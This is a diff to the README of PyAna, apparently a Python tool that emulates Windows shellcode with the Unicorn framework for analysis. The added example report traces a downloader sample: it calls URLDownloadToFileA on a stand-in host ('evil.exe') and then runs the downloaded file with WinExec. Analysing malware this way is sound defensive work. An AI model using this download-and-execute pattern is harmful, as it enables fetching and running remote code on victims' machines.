@@ -3,9 +3,19 @@ PyAna - Analyzing the Windows shellcode.
 Using Unicorn Framework for emulating shellcode. PyAna emulate a process on Windows: PEB, TIB, LDR_MODULE to create a emulative environment.
 
 #Usage
-    -From commandline type: PyAna.py [shellcode]
+* From commandline type: PyAna.py [shellcode]
+* Ex: PyAna.py UrlDownloadToFile.sc . Show report:
+    -  Emulate w32Shell Start...
+    - 0x4014b:	call LoadLibraryA('urlmon')
+    - 0x4017a:	call GetTempPathA(len=0x104, buf=0x41fe4)
+    - 0x401b2:	call URLDownloadToFileA(Url=http://blahblah.com/evil.exe0,
+    LocalPath=c:\users\r06u3\appdata\local\tempdEbW.exe)
+    - 0x401bd:	call WinExec('c:\users\r06u3\appdata\local\tempdEbW.exe', 1)
+    - 0x401cb:	call ExitProcess(0x755c3a63)
+    - Emulation done...
+
 #Dependencies
--PyAna depends on :
+PyAna depends on :
 * [Unicorn Framework] developing by Nguyen Anh Quynh. 
 * [pefile] developing by Ero Carrera
 
